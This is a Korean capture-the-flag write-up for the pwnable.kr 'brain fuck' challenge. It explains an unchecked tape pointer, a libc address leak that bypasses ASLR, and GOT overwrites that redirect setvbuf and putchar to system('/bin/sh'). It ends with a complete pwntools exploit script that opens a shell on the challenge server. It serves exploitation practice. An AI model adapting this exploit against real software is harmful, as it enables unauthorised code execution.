---
sort: 1
---

# brain fuck

```tip
그림 작아서 안보이면 새창에서 여세요.
```

bf 바이너리와 bf_libc.so를 다운받자.

<img src="/picture/pwnable.kr/bf_1.png" width="1000"/>

main함수는 간단하다. 사용자의 input을 받아서 while문 안에서 한 바이트씩 읽으면서 do_brainfuck함수에 한 바이트씩 건네준다.<br><br>

<img src="/picture/pwnable.kr/bf_2.png" width="1000"/>

main함수에서 접근하는 p는 전역변수이고, p가 맨 처음에 가리키는 주소는 tape라는 전역변수이다.<br>
brainfuck에 대한 연산에 대한 결과를 저장하기 위해서 tape라는 공간을 만들어둔 듯 하다.<br><br>

<img src="/picture/pwnable.kr/bf_3.png" width="1000"/>

do_brainfuck함수도 간단하다. brainfuck 문법에 충실하여 구현하였다. ([]빼고.)<br>
그러나, p값을 증가 및 감소시킬 때, p값이 유효한 범위 내에 있는지(tape내부에 있는지) 확인해야하는데 확인을 하지 않는다.<br>
따라서 tape의 범위를 넘어서서 다른 공간의 데이터를 읽고, 조질 수 있다.<br><br>

<img src="/picture/pwnable.kr/bf_4.png" width="1000"/>

tape 위를 보니 got 및 여러 값들이 보인다.<br>
이를 이용해서 프로그램을 조져버리면 된다.<br><br>

stdin값을 읽어서 libc내부에 _IO_2_1_stdin_ 주소값을 얻는다.<br>
libc내부에 존재하는 symbol의 주소값을 읽어왔으니, libc에 걸려있는 ASLR을 우회하게 되었다.<br>
_IO_2_1_stdin_ 주소값을 기준으로 system함수, /bin/sh 문자열의 위치를 구할 수 있게 되었다.<br>
각각의 offset은 bf_libc.so파일을 들여다보면 알 수 있다.<br><br>
어떻게 하면 `system("/bin/sh")`를 트리거할 수 있는가?<br>
main함수에 존재하는 `setvbuf(*stdout, 0, 2, 0)` 루틴을 사용하기로 했다.<br>
setvbuf의 got값을 system함수의 주소로 바꾸고, stdout값을 "/bin/sh"의 주소값으로 바꾸게 되면, `system("/bin/sh")`을 호출할 수 있게 된다.<br>
따라서 저 둘을 바꾼 뒤, 맨 마지막으로 putchar의 got값을 main함수의 `setvbuf(*stdout, 0, 2, 0)` 루틴 주소로 바꾼 뒤 putchar를 호출하면, 쉘을 얻을 수 있게 된다.

```python
from pwn import *

p = remote("pwnable.kr", 9001)
print(p.recvline())
print(p.recvline())

#stdin = _IO_2_1_stdin_
#              read _IO_2_1_stdin_            setvbuf's got = system     stdout = "/bin/sh"        putchar's got = setvbuf_routine
p.send(0x5d*"<" + ".<.<.<." + 0x20*"<" + 0x8*">" + ",>,>,>,>>>>>"+ 0x30*">"+",>,>,>,<<<"+0x30*"<" + ",>,>,>,.\n")
a = p.recv(1)
b = p.recv(1)
c = p.recv(1)
d = p.recv(1)

system_addr = 0
system_addr += int.from_bytes(a, "little") * 16 ** 6
system_addr += int.from_bytes(b, "little") * 16 ** 4
system_addr += int.from_bytes(c, "little") * 16 ** 2
system_addr += int.from_bytes(d, "little")

system_addr -= 0x00177800
bin_sh_addr = system_addr + 0x120C6B

setvbuf_routine = 0x8048694
payload = p32(system_addr) + p32(bin_sh_addr) + p32(setvbuf_routine)
p.send(payload)
p.interactive()
```

```tip
## 알게 된 점

brain fuck
```